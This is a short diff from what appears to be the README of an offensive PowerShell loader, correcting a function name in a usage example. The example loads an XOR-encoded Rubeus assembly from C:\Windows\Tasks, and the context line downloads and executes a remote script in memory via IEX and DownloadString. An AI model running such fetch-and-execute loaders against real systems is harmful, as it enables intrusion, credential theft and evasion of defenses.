@@ -225,7 +225,7 @@ PS C:\Users\pentester>
 
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXORLocal.ps1"));
-Invoke-LoadAssemblyXOR -AssemblyPath "C:\\Windows\\Tasks\\rubeusxorb64meow.txt" -KeyString "enc_password_here" -Command "hash /password:test"
+Invoke-LoadAssemblyXORLocal -AssemblyPath "C:\\Windows\\Tasks\\rubeusxorb64meow.txt" -KeyString "enc_password_here" -Command "hash /password:test"
 
 ```
 Or using the oneliners:
